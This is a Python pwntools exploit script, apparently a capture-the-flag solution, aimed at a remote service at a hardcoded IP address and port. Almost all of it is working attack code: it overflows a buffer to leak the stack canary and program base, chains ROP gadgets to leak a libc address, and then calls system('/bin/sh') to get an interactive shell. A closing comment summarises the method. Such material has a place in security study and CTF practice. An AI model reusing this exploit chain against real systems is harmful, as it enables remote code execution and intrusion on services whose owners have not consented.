from pwn import *

for _ in range(32):
	#r = process("./challenge")
	#gdb.attach(r)
	r = remote("34.124.217.71", 31337)
	r.recvuntil(b'>')
	
	def func1(size, name):
		r.sendline(b'1')
		r.recvuntil(b'String length:')
		r.sendline(str(size).encode("utf-8"))
		r.recvuntil(b'String:')
		r.send(name)
		try:
			return r.recvuntil(b'>')
		except:
			return r.recv()

	def func2(size, name):
		r.sendline(b'2')
		r.recvuntil(b'(in bytes):')
		r.sendline(str(size).encode("utf-8"))
		r.recvuntil(b'String:')
		r.send(name)
		return r.recvuntil(b'>')
	
	def func3(size):
		r.sendline(b'3')
		r.recvuntil(b'String length:')
		r.sendline(str(size).encode("utf-8"))
		r.recv()
		return r.recvuntil(b'>')
	
	
	size = 1026
	payload = b'a'*size*4 #+ p32(0x1337)*2
	stuff = func1(size, payload)
	if(b'Error\n' in stuff):
		r.close()
	else:
		#gdb.attach(r)
		stuff = stuff.split(b'\n*')[0].split(b'Converted string: ')[1].split(b'\xfd\xa1\x98\x96\x85\xa1')[-1]
		stuff = func2(len(stuff), stuff).split(b'\n***')[0].split(b'ted string: ')[1]
		print(stuff)
		#print(b"canary: " + stuff[0:8])
		#print(b"stackx: " + stuff[8:16])
		#print(b"elf_base: " + stuff[16:24])
		
		canary = int.from_bytes(stuff[0:8], "little")
		print("canary: " + hex(canary))
		stackx = int.from_bytes(stuff[8:16], "little")
		print("stackx: " + hex(stackx))
		elf_base = int.from_bytes(stuff[16:24], "little") - 0x0000000000001a9a
		print("elf_base: " + hex(elf_base))
		
		main45 = elf_base + 0x0000000000001a9a
		pop_rdi_ret = elf_base + 0x0000000000001b93
		pop_rsi_r15_ret = elf_base + 0x0000000000001b91
		just_cout = elf_base + 0x1210
		just_cout_rdi = elf_base + 0x4080
		malloc_got = elf_base + 0x000000000003f90

		#gdb.attach(r)

		payload = p64(0)
		payload += b'a'*(size*4 - len(payload)) 
		payload += p64(canary) + p64(stackx) + p64(pop_rdi_ret) + p64(0)
		payload += p64(pop_rdi_ret) + p64(just_cout_rdi)
		payload += p64(pop_rsi_r15_ret) + p64(malloc_got) + p64(0)
		payload += p64(just_cout) + p64(main45)
		stuff = func1(len(payload)//4, payload).split(b'****************')[0][-6:]
		libc_base = int.from_bytes(stuff, "little") - 0x000000000009d260
		print("libc_base: " + hex(libc_base))
		
		system = libc_base + 0x0000000000055410
		binsh = libc_base + 0x1b75aa
		ret = elf_base + 0x000000000000101a

		payload = p64(0)
		payload += b'a'*(size*4 - len(payload)) 
		payload += p64(canary) + p64(stackx) 
		payload += p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
		
		#func1(len(payload)//4, payload)

		r.sendline(b'1')
		r.recvuntil(b'String length:')
		r.sendline(str(len(payload)//4).encode("utf-8"))
		r.recvuntil(b'String:')
		r.send(payload)



		r.interactive()

# my solution: leak canary and ELF address via encoding func, make rop chain to leak libc, then make system get shell
# author's solution: overflow heap to overwrite file object stored in heap and ... 		